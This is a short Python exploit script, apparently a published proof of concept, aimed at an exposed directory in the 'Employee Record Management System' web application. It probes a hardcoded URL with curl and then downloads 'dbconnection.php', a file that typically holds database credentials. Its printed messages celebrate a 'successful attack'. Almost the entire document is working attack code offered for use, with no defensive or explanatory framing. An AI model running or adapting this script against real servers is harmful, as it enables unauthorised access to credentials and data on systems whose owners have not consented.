#!/usr/bin/python
# Author nu11secur1ty

import urllib.request
import os, time
from colorama import init, Fore, Back, Style
init(convert=True)
import requests

# Exploit and get files
print(Fore.GREEN +"Checking if we have a vulnerable directory traversal...")
print(Style.RESET_ALL)
time.sleep(15)

# Yor vulnerable path for checking...
url = 'http://192.168.1.135/Employee-Record-Management-System-Project/erms/admin/includes/'

# Check for vulnerability
print(Fore.YELLOW +"The request for checking is:...")
print(Style.RESET_ALL)
os.system('curl --path-as-is ' + url)

# Getting a sensitive information from vulnerable directory
print(Fore.RED +"Let's get some files from the vulnerable server... =)")
print(Style.RESET_ALL)
time.sleep(15)

# Get files from vulnerable and not protected directory
urllib.request.urlretrieve(url, "dbconnection.php")
print(Fore.GREEN +"Done! You have a successful attack and you've got some files. =)")
print(Style.RESET_ALL)
